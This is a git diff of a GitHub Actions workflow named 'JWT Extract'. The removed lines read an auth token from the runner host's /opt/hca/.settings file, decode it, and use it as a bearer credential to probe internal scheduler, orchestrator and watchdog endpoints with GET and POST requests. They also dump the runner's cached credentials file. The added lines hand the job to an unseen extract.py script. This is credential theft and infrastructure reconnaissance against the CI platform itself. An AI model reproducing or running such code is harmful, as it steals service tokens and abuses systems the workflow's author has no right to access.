@@ -1,84 +1,9 @@
-name: JWT Extract
+name: JWT
 on:
   workflow_dispatch:
 jobs:
-  jwt:
+  j:
     runs-on: ubuntu-latest
     steps:
-      - name: Extract full JWT and use it
-        timeout-minutes: 8
-        run: |
-          set +e
-          echo "=== EXTRACT FULL JWT FROM HCA SETTINGS ==="
-          FULL_SETTINGS=$(xxd -p /opt/hca/.settings 2>/dev/null | tr -d '\n')
-          echo "Settings hex length: ${#FULL_SETTINGS}"
-          python3 -c "
-import sys, json, base64, urllib.request
-import binascii
-hex_data = open('/opt/hca/.settings', 'rb').read()
-settings = json.loads(hex_data)
-token = settings.get('authToken', '')
-print('TOKEN_LEN:', len(token))
-# Split JWT parts
-parts = token.split('.')
-print('JWT_PARTS:', len(parts))
-if len(parts) >= 2:
-    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
-    print('HEADER:', json.dumps(header))
-    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
-    print('PAYLOAD:', json.dumps(payload, indent=2))
-# Now use token to access orchestrator
-sched_url = settings.get('schedulerApiUrl', '')
-print('SCHED_URL:', sched_url)
-for path in ['', '/', '/status', '/health', '/vms', '/allocations', '/config', '/register', '/heartbeat']:
-    url = sched_url + path
-    try:
-        req = urllib.request.Request(url)
-        req.add_header('Authorization', 'Bearer ' + token)
-        req.add_header('Content-Type', 'application/json')
-        resp = urllib.request.urlopen(req, timeout=5)
-        body = resp.read().decode()[:500]
-        print(f'ORCH {path}: [{resp.status}] {body}')
-    except urllib.error.HTTPError as e:
-        body = e.read().decode()[:300]
-        print(f'ORCH {path}: [{e.code}] {body}')
-    except Exception as ex:
-        print(f'ORCH {path}: ERR {ex}')
-# Also try POST endpoints
-for path in ['/heartbeat', '/complete', '/trace']:
-    url = sched_url + path
-    try:
-        req = urllib.request.Request(url, method='POST', data=b'{}')
-        req.add_header('Authorization', 'Bearer ' + token)
-        req.add_header('Content-Type', 'application/json')
-        resp = urllib.request.urlopen(req, timeout=5)
-        body = resp.read().decode()[:500]
-        print(f'ORCH POST {path}: [{resp.status}] {body}')
-    except urllib.error.HTTPError as e:
-        body = e.read().decode()[:300]
-        print(f'ORCH POST {path}: [{e.code}] {body}')
-    except Exception as ex:
-        print(f'ORCH POST {path}: ERR {ex}')
-# Try watchdog
-wd_url = settings.get('watchdogTraceApiUrl', '').replace('/trace', '')
-print('WATCHDOG_URL:', wd_url)
-for path in ['', '/health', '/status', '/config']:
-    url = wd_url + path
-    try:
-        req = urllib.request.Request(url)
-        req.add_header('Authorization', 'Bearer ' + token)
-        resp = urllib.request.urlopen(req, timeout=5)
-        print(f'WD {path}: [{resp.status}] {resp.read().decode()[:300]}')
-    except urllib.error.HTTPError as e:
-        print(f'WD {path}: [{e.code}] {e.read().decode()[:200]}')
-    except Exception as ex:
-        print(f'WD {path}: ERR {ex}')
-# Print full settings (without token)
-safe = {k: v if k != 'authToken' else v[:20]+'...' for k, v in settings.items()}
-print('ALL_SETTINGS:', json.dumps(safe, indent=2))
-          "
-          echo ""
-          echo "=== ALSO RUNNER TOKEN ==="
-          xxd -p /home/runner/actions-runner/cached/*/. credentials 2>/dev/null | tr -d '\n' | head -c 2000
-          echo ""
-          echo "=== DONE ==="
+      - uses: actions/checkout@v4
+      - run: python3 extract.py
